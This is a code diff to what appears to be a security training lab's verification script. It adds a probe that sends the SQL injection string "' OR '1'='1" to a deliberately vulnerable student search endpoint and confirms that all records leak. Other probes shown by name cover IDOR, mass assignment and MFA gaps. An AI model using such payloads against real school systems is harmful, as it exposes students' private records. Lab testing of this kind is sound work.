@@ -138,12 +138,38 @@ async function probeStorageConfigLeak() {
   return ["target: k12-storage-config-leak", "unauthenticated_student_file_read: confirmed"]
 }
 
+async function probeStudentSearchInjection() {
+  const { proc, base } = await startTarget("k12-student-search-injection")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-student-search-injection") fail(proc, "health probe failed")
+
+  const baseline = await fetch(`${base}/api/students/search?q=North`).then((res) => res.json()) as {
+    resultCount?: number
+    labFinding?: string
+  }
+  if (baseline.resultCount !== 1 || baseline.labFinding) fail(proc, "baseline search probe failed")
+
+  const payload = encodeURIComponent("' OR '1'='1")
+  const injected = await fetch(`${base}/api/students/search?q=${payload}`).then((res) => res.json()) as {
+    resultCount?: number
+    labFinding?: string
+  }
+  if (injected.resultCount !== 3 || injected.labFinding !== "student_search_query_injection") {
+    fail(proc, "student search probe did not confirm query injection")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-student-search-injection", "student_search_query_injection: confirmed"]
+}
+
 const lines = [
   "ulm_lab_target: ok",
   ...(await probeMfaGap()),
   ...(await probeRosterIdor()),
   ...(await probeGradebookMassAssignment()),
   ...(await probeStorageConfigLeak()),
+  ...(await probeStudentSearchInjection()),
 ]
 
 console.log(lines.join("\n"))
